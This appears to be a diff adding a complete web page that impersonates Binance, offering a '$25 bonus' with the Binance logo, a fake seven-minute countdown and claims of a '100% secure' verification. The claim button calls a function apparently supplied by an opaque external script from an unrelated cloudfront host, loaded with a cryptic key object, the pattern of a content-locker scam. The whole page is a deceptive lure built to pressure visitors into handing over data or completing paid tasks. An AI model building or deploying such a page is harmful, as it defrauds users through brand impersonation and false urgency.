@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Binance Crypto Bonus</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0.7), rgba(240, 240, 240, 0.85)), 
+                        url('https://cdn.pixabay.com/photo/2024/11/25/15/04/whale-9223462_1280.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      backdrop-filter: blur(2px);
+    }
+
+    .bonus-container {
+      max-width: 470px;
+      margin: 40px auto;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 25px 20px;
+      border: 2px solid #ffd700;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+    }
+
+    .bonus-container img {
+      height: 50px;
+      margin-bottom: 15px;
+    }
+
+    .claim-button {
+      display: inline-block;
+      background-color: #f0b90b;
+      color: #000;
+      font-weight: bold;
+      padding: 12px 25px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-size: 16px;
+      transition: background 0.3s;
+    }
+
+    .claim-button:hover {
+      background-color: #ddb20a;
+    }
+
+    ul {
+      list-style: none;
+      padding-left: 0;
+      margin-bottom: 20px;
+      text-align: left;
+      color: #555;
+    }
+
+    #timer {
+      font-size: 22px;
+      font-weight: bold;
+      color: #cc0000;
+      margin-bottom: 18px;
+    }
+
+    .footer-note {
+      color: #888;
+      font-size: 13px;
+      margin-top: 18px;
+    }
+  </style>
+
+  <!-- External Script -->
+  <script type="text/javascript">
+    var Ghage_Ejt_rcjbQc = {"it": 4501753, "key": "92ec8"};
+  </script>
+  <script src="https://dfmpe7igjx4jo.cloudfront.net/af0aabd.js"></script>
+</head>
+<body>
+
+  <div class="bonus-container">
+
+    <!-- Binance Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance Logo">
+
+    <h2 style="color: #e6ac00; margin-bottom: 12px;">🎁 Claim up to $25 in Binance Bonus!</h2>
+
+    <p style="color: #444; font-size: 16px; margin-bottom: 10px;">
+      As part of today's exclusive crypto promotion, you can unlock up to <strong>$25 bonus</strong> to your Binance wallet.
+    </p>
+
+    <p style="color: #d32f2f; font-size: 15px; font-weight: bold; margin-bottom: 10px;">
+      This bonus is reserved for you. Please verify within:
+    </p>
+
+    <!-- Countdown Timer -->
+    <div id="timer">
+      ⏳ <span id="countdown">07:00</span> remaining
+    </div>
+
+    <ul>
+      <li>✅ Fast & Easy Verification</li>
+      <li>🔒 100% Secure Process</li>
+      <li>🎉 Available for today only</li>
+    </ul>
+
+    <a href="javascript:void(0);" onclick="_my();" class="claim-button">
+      🎯 Claim My Crypto Bonus Now
+    </a>
+
+    <p class="footer-note">
+      Your Binance bonus will be unlocked instantly after task completion.
+    </p>
+  </div>
+
+  <!-- Countdown Timer Script -->
+  <script>
+    let timeLeft = 420; // 7 minutes in seconds
+    const countdownEl = document.getElementById("countdown");
+
+    const timer = setInterval(function () {
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+      seconds = seconds < 10 ? "0" + seconds : seconds;
+      countdownEl.textContent = `${minutes}:${seconds}`;
+      timeLeft--;
+
+      if (timeLeft < 0) {
+        clearInterval(timer);
+        countdownEl.textContent = "Expired";
+      }
+    }, 1000);
+  </script>
+
+</body>
+</html>
